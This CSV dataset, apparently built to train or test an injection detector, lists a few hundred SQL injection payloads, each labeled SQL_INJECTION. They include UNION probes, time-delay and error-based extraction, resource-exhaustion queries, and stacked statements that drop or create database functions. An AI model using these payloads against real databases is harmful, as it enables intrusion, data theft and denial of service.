payload,length,label
-1564') order by 1--,20,SQL_INJECTION
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ynpr'='ynpr",124,SQL_INJECTION
"1%'))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",109,SQL_INJECTION
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",66,SQL_INJECTION
"-2718"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""kbvd"" like ""kbvd",232,SQL_INJECTION
"-9922')) union all select 2193,2193,2193--",42,SQL_INJECTION
"1%"" and elt(3114=3114,sleep(5))#",32,SQL_INJECTION
"-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",105,SQL_INJECTION
"1')) and make_set(3793=8118,8118) and (('swvc' like 'swvc",57,SQL_INJECTION
"1 where 4787=4787;iif(1483=7301,1,1/0)",38,SQL_INJECTION
"-2377%'))) union all select 7706,7706--",39,SQL_INJECTION
"1'||(select 'uusj' where 2149=2149 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",98,SQL_INJECTION
1') where 7537=7537 and 2006=2006,33,SQL_INJECTION
"1%"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""%""=""",116,SQL_INJECTION
"-5959"" or 2477=1144",19,SQL_INJECTION
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",135,SQL_INJECTION
"-7565')) union all select 7745,7745,7745,7745,7745,7745#",56,SQL_INJECTION
1%'))) union all select null#,29,SQL_INJECTION
"-8794))) union all select 5802,5802,5802--",42,SQL_INJECTION
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""hhwy""=""hhwy",113,SQL_INJECTION
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",51,SQL_INJECTION
"-8933) as iiyr where 1974=1974 union all select 1974,1974,1974,1974,1974#",73,SQL_INJECTION
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('dthp'='dthp",80,SQL_INJECTION
1'));select case when 7717=7717 then 1 else null end--,54,SQL_INJECTION
"1%"")) and sleep(5)#",19,SQL_INJECTION
1) and (2342=3620)*3620,23,SQL_INJECTION
"1;iif(5257=5257,1,1/0)",22,SQL_INJECTION
"-7418 union all select 1340,1340,1340,1340,1340#",48,SQL_INJECTION
"1'||(select 'vekn' from dual where 4929=4929 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",123,SQL_INJECTION
1'+(select 'mdxt' where 2733=2733 or 4240=(select 4240 from pg_sleep(5))--,74,SQL_INJECTION
"1%"";select pg_sleep(5)--",24,SQL_INJECTION
-7164%' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',219,SQL_INJECTION
"1';select * from generate_series(7237,7237,case when (7237=9757) then 1 else 0 end) limit 1--",93,SQL_INJECTION
"1)) and elt(4249=4249,7259) and ((5683=5683",43,SQL_INJECTION
"1') where 9159=9159;iif(3548=8646,1,1/0)",40,SQL_INJECTION
-9087 or 3038=3038,18,SQL_INJECTION
1) as mixt where 1085=1085 or sleep(5)--,40,SQL_INJECTION
"1))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((9462=9462",118,SQL_INJECTION
"1' where 1093=1093 union all select null,null,null,null,null,null,null--",72,SQL_INJECTION
"1%""))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",82,SQL_INJECTION
-3243 or 2266=3583#,19,SQL_INJECTION
"1"") as zuzm where 1211=1211 and elt(5458=2966,2966)--",53,SQL_INJECTION
"1"" where 7828=7828;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",102,SQL_INJECTION
"1)) as kgit where 1919=1919 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",135,SQL_INJECTION
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",134,SQL_INJECTION
1');if(2697=2008) select 2697 else drop function jcoo--,55,SQL_INJECTION
"1"");select sleep(5) and (""innk""=""innk",37,SQL_INJECTION
1') and 7533=7533,17,SQL_INJECTION
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'rxdz'='rxdz",190,SQL_INJECTION
1;select pg_sleep(5)--,22,SQL_INJECTION
"-4764) where 8200=8200 union all select 8200,8200,8200,8200--",61,SQL_INJECTION
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'adsh'='adsh",159,SQL_INJECTION
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('ctbs' like 'ctbs",113,SQL_INJECTION
-6405%'))) or (8459=8459)*4906 and ((('%'=',43,SQL_INJECTION
1%')));(select * from (select(sleep(5)))acdk)#,46,SQL_INJECTION
"1))) union all select null,null,null--",38,SQL_INJECTION
"1"") where 7471=7471 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",157,SQL_INJECTION
"1 union all select null,null,null,null,null,null,null,null#",59,SQL_INJECTION
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",94,SQL_INJECTION
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('fgox' like 'fgox",199,SQL_INJECTION
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fmkz' like 'fmkz",220,SQL_INJECTION
"1""))) union all select null,null,null,null,null#",48,SQL_INJECTION
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""jzsb""=""jzsb",118,SQL_INJECTION
1));select (case when (6843=2657) then 6843 else 6843*(select 6843 from information_schema.character_sets) end)#,112,SQL_INJECTION
"1"");select pg_sleep(5)--",24,SQL_INJECTION
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",216,SQL_INJECTION
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'owwf'='owwf",220,SQL_INJECTION
"1"" or (select * from (select(sleep(5)))ydpu) and ""pxix""=""pxix",61,SQL_INJECTION
"1'+(select 'nmhy' where 2919=2919 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",136,SQL_INJECTION
"1'+(select ttae where 4601=4601 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",108,SQL_INJECTION
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'lckw'='lckw",101,SQL_INJECTION
"1)) as cusv where 4871=4871 and elt(1210=1210,sleep(5))--",57,SQL_INJECTION
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('qvqf'='qvqf",118,SQL_INJECTION
1')));select sleep(5) and ((('thqr' like 'thqr,46,SQL_INJECTION
-4758%')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('%'=',114,SQL_INJECTION
"1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",126,SQL_INJECTION
"1' in boolean mode) union all select null,null,null,null,null#",62,SQL_INJECTION
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('juhi' like 'juhi",116,SQL_INJECTION
-8292%') or 8571=8571--,23,SQL_INJECTION
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""qwdi""=""qwdi",120,SQL_INJECTION
"1"") as lrew where 6067=6067 union all select null,null,null,null,null,null,null#",80,SQL_INJECTION
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8503=8503",116,SQL_INJECTION
"-7743"" or 9323=9323#",20,SQL_INJECTION
"1"") where 1807=1807;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,SQL_INJECTION
-3648' where 4629=4629 order by 1--,35,SQL_INJECTION
"1'+(select 'zxxh' where 4065=4065 and 8635=(select count(*) from generate_series(1,5000000))--",94,SQL_INJECTION
"-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--",62,SQL_INJECTION
"1,iif(7475=7475,1,1/0)",22,SQL_INJECTION
1%' and 9198=9198--,19,SQL_INJECTION
1) and 5196=9002,16,SQL_INJECTION
"1%"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",111,SQL_INJECTION
"-4480') where 4661=4661 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",220,SQL_INJECTION
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'pphf'='pphf",109,SQL_INJECTION
1') where 3588=3588;begin user_lock.sleep(5); end--,51,SQL_INJECTION
1' where 2145=2145;select sleep(5)#,35,SQL_INJECTION
"1%')));iif(5257=5257,1,1/0)",27,SQL_INJECTION
1' and 1661=1244 and 'dcha'='dcha,33,SQL_INJECTION
-6487) or 6872=6872 and (7688=7688,34,SQL_INJECTION
"1' where 7613=7613;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",135,SQL_INJECTION
"-1376%""))) or 3458=9503 and (((""%""=""",36,SQL_INJECTION
1')));if(3245=6168) select 3245 else drop function nafj--,57,SQL_INJECTION
"-4047'||(select 'rqta' from dual where 9743=9743 union all select 9743,9743,9743#",81,SQL_INJECTION
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",66,SQL_INJECTION
1');select pg_sleep(5) and ('itgc'='itgc,40,SQL_INJECTION
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('jylk'='jylk",98,SQL_INJECTION
1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,102,SQL_INJECTION
"-3126)) union all select 6718,6718,6718,6718,6718--",51,SQL_INJECTION
1'));(select * from (select(sleep(5)))srmq) and (('nbzf' like 'nbzf,67,SQL_INJECTION
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",126,SQL_INJECTION
1%')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,71,SQL_INJECTION
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'mnbg' like 'mnbg",83,SQL_INJECTION
"-5041'))) union all select 4820,4820,4820,4820,4820,4820--",58,SQL_INJECTION
"1')));iif(1149=4765,1,1/0)",26,SQL_INJECTION
"1')) union all select null,null,null--",38,SQL_INJECTION
"1'||(select 'ufgs' where 9670=9670 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",193,SQL_INJECTION
"1%')) or 8421=(select count(*) from generate_series(1,5000000)) and (('%'='",75,SQL_INJECTION
1')) and 4595=4595#,19,SQL_INJECTION
1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',60,SQL_INJECTION
"-4522"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mbkq""=""mbkq",256,SQL_INJECTION
-9456%'))) order by 1#,22,SQL_INJECTION
-6298' or 4724=4876,19,SQL_INJECTION
"1)));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",89,SQL_INJECTION
"1%"") waitfor delay '0:0:5'--",28,SQL_INJECTION
-5389'||(select 'gggl' where 1020=1020 union all select 1020#,61,SQL_INJECTION
"1"") or elt(5873=5873,sleep(5))#",31,SQL_INJECTION
"-9634'))) union all select 4141,4141#",37,SQL_INJECTION
"1"" where 9461=9461;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",86,SQL_INJECTION
"1) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",105,SQL_INJECTION
"1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",99,SQL_INJECTION
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('opyp'='opyp,255,SQL_INJECTION
"-9861' union all select 5710,5710,5710,5710,5710--",50,SQL_INJECTION
"1%""))) union all select null,null,null,null,null,null,null#",59,SQL_INJECTION
"1') where 9516=9516;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",107,SQL_INJECTION
"-2006')) union all select 7852,7852,7852,7852,7852--",52,SQL_INJECTION
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",69,SQL_INJECTION
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",63,SQL_INJECTION
1' union all select null--,26,SQL_INJECTION
-9331' or (4519=2912)*2912 and 'rddk'='rddk,43,SQL_INJECTION
"-9531'))) union all select 4076,4076#",37,SQL_INJECTION
1) waitfor delay '0:0:5'--,26,SQL_INJECTION
1));(select * from (select(sleep(5)))acdk)#,43,SQL_INJECTION
"1"") as boeh where 2571=2571 union all select null#",50,SQL_INJECTION
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",203,SQL_INJECTION
"1' or 8466=benchmark(5000000,md5(0x694a4745))",45,SQL_INJECTION
"-3359 union all select 4675,4675,4675--",39,SQL_INJECTION
"-4980"" or (8459=8459)*4906 and ""mnlj"" like ""mnlj",48,SQL_INJECTION
"-2434'))) union all select 5509,5509,5509,5509,5509,5509,5509--",63,SQL_INJECTION
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--",97,SQL_INJECTION
1'))) or sleep(5) and ((('bmnf' like 'bmnf,42,SQL_INJECTION
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",143,SQL_INJECTION
"1%"";begin user_lock.sleep(5); end--",35,SQL_INJECTION
"-2013"")) as kisy where 3802=3802 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",127,SQL_INJECTION
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'qyyg'='qyyg",113,SQL_INJECTION
"-2898"" where 3301=3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",90,SQL_INJECTION
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('iqvg'='iqvg",126,SQL_INJECTION
"1%' or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,SQL_INJECTION
1) and 2006=2006,16,SQL_INJECTION
"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",87,SQL_INJECTION
"1) as lhie where 4631=4631 union all select null,null,null,null,null--",70,SQL_INJECTION
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",204,SQL_INJECTION
"1"" where 7158=7158;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",86,SQL_INJECTION
(select (case when (4108=4108) then 1 else 4108*(select 4108 from information_schema.character_sets) end)),106,SQL_INJECTION
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'vunt'='vunt",127,SQL_INJECTION
1'));select (case when (9667=6212) then 9667 else cast(1 as int)/(select 0 from dual) end) from dual--,102,SQL_INJECTION
1%';waitfor delay '0:0:5'--,27,SQL_INJECTION
"1"") where 1793=1793;select (case when (5390=7419) then 5390 else 5390*(select 5390 from mysql.db) end)#",103,SQL_INJECTION
"1%"";(select * from (select(sleep(5)))acdk)#",43,SQL_INJECTION
1)));select sleep(5) and (((8354=8354,37,SQL_INJECTION
"-8684 union all select 9519,9519,9519,9519--",44,SQL_INJECTION
"1"");iif(5257=5257,1,1/0)",24,SQL_INJECTION
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('skdy'='skdy",133,SQL_INJECTION
"-1588%""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",141,SQL_INJECTION
"1) as afxc where 7497=7497;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",123,SQL_INJECTION
"-8734%"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",217,SQL_INJECTION
"-3391' union all select 2024,2024--",35,SQL_INJECTION
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",63,SQL_INJECTION
"-9924)) as zgqa where 2867=2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",99,SQL_INJECTION
1') order by 1#,15,SQL_INJECTION
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""gcnq"" like ""gcnq",181,SQL_INJECTION
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq",133,SQL_INJECTION
1)) as xmac where 7692=7692;begin dbms_lock.sleep(5); end--,59,SQL_INJECTION
1') as wvvo where 4288=4288;select (case when (5009=1133) then 5009 else 5009*(select 5009 from information_schema.character_sets) end)#,136,SQL_INJECTION
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# msrb",103,SQL_INJECTION
"1%'))) union all select null,null,null--",40,SQL_INJECTION
"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",51,SQL_INJECTION
"1"" or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",140,SQL_INJECTION
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""suxh""=""suxh",227,SQL_INJECTION
"-7678))) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",67,SQL_INJECTION
"1"")) as gawq where 4728=4728 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,SQL_INJECTION
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",70,SQL_INJECTION
"1')) as uizu where 1774=1774;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",96,SQL_INJECTION
"1) or 8514=benchmark(5000000,md5(0x544d5a4c))#",46,SQL_INJECTION
"1%""))) and (select * from (select(sleep(5)))fzno) and (((""%""=""",62,SQL_INJECTION
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""mejy""=""mejy",176,SQL_INJECTION
-1280')) or 8571=8571--,23,SQL_INJECTION
"1"") where 7228=7228;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,SQL_INJECTION
-5327'))) or 1606=6099,22,SQL_INJECTION
"1'+(select iutk where 6158=6158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",120,SQL_INJECTION
"-5009) where 8463=8463 union all select 8463,8463,8463,8463,8463,8463--",71,SQL_INJECTION
"-8054')) union all select 5232,5232,5232,5232,5232,5232,5232#",61,SQL_INJECTION
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('gcna'='gcna",127,SQL_INJECTION
"1%"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""%""=""",87,SQL_INJECTION
"1%"" rlike sleep(5)#",19,SQL_INJECTION
"1') as rvch where 1863=1863 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",89,SQL_INJECTION
"1""))) or sleep(5) and (((""eran""=""eran",37,SQL_INJECTION
"1',(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",101,SQL_INJECTION
"1"" where 6347=6347 union all select null,null,null,null,null,null,null,null#",76,SQL_INJECTION
"1%"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",109,SQL_INJECTION
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",78,SQL_INJECTION
"-1339))) union all select 2938,2938,2938,2938,2938,2938#",56,SQL_INJECTION
"1"" where 8734=8734;select * from generate_series(7762,7762,case when (7762=1293) then 1 else 0 end) limit 1--",109,SQL_INJECTION
"1',updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",90,SQL_INJECTION
"1%""));select count(*) from generate_series(1,5000000)--",55,SQL_INJECTION
1'||(select 'uiyj' from dual where 8320=8320;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,153,SQL_INJECTION
"-2323"") as zgsn where 9274=9274 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",219,SQL_INJECTION
"1"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vurb"" like ""vurb",229,SQL_INJECTION
"-3505"") or 5290=3436--",22,SQL_INJECTION
"1)) as krzi where 8727=8727 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,SQL_INJECTION
"-8094) or elt(1032=1032,3623) and (4569=4569",44,SQL_INJECTION
"1'||(select 'zbdv' where 1618=1618 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",140,SQL_INJECTION
-1579%'))) union all select 7272#,33,SQL_INJECTION
"-2059%"" or elt(4587=3101,3101) and ""%""=""",40,SQL_INJECTION
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",57,SQL_INJECTION
"-7296%'))) union all select 9322,9322,9322,9322--",49,SQL_INJECTION
-4961') or 3038=3038,20,SQL_INJECTION
1');select sleep(5) and ('hhlq' like 'hhlq,42,SQL_INJECTION
"1"")) as gbxx where 2459=2459 waitfor delay '0:0:5'--",52,SQL_INJECTION
"1"") where 8571=8571 and elt(4249=4249,7259)--",45,SQL_INJECTION
1') as syer where 3141=3141 rlike (select (case when (6233=7567) then 1 else 0x28 end))--,89,SQL_INJECTION
"1"") as jmwr where 5978=5978 rlike (select (case when (1396=8762) then 1 else 0x28 end))--",89,SQL_INJECTION
"1%'))) union all select null,null,null,null,null,null,null,null,null--",70,SQL_INJECTION
1%'))) rlike sleep(5) and ((('%'=',34,SQL_INJECTION
"-7381')) or elt(5882=5919,5919) and (('nzri'='nzri",50,SQL_INJECTION
-6341' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'ugys'='ugys,116,SQL_INJECTION
"1'||(select 'rask' from dual where 9411=9411 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",244,SQL_INJECTION
-4761 order by 1--,18,SQL_INJECTION
1'||(select 'xemx' from dual where 4683=4683 or sleep(5)#,57,SQL_INJECTION
1)) or (select * from (select(sleep(5)))sddo)#,46,SQL_INJECTION
"1')) as omwk where 1414=1414 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",138,SQL_INJECTION
"1'+(select byor where 4538=4538;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'",100,SQL_INJECTION
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,SQL_INJECTION
"1'||(select 'iwlj' where 8704=8704 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",209,SQL_INJECTION
"1"") as frmp where 6073=6073;select (case when (8689=2468) then 8689 else 1/(select 0) end)--",92,SQL_INJECTION
"1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--",57,SQL_INJECTION
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null)",68,SQL_INJECTION
"1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",173,SQL_INJECTION
"1%""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",147,SQL_INJECTION
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",66,SQL_INJECTION
"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""=""",145,SQL_INJECTION
"1)) as cdhd where 2958=2958 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,SQL_INJECTION
1' where 6583=6583;select case when 4537=8418 then 1 else null end--,68,SQL_INJECTION
"-7845' union all select 9574,9574,9574,9574,9574,9574#",54,SQL_INJECTION
1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||',67,SQL_INJECTION
